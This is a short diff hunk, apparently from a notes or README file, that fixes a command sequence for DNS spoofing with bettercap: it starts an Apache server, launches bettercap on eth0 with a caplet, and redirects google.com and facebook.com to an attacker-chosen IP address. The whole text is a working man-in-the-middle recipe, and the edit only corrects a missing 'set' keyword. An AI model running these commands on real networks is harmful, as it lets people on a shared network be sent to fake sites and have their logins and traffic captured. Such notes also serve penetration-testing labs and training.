@@ -9,7 +9,7 @@ service apache2 start
 var/www/html
 
 bettercap -iface eth0 --caplet spoof.cap
-dns.spoof.address <IP address to map the domains to>
+set dns.spoof.address <IP address to map the domains to>
 set dns.spoof.all true
 set dns.spoof.domains google.com,facebook.com
 dns.spoof on
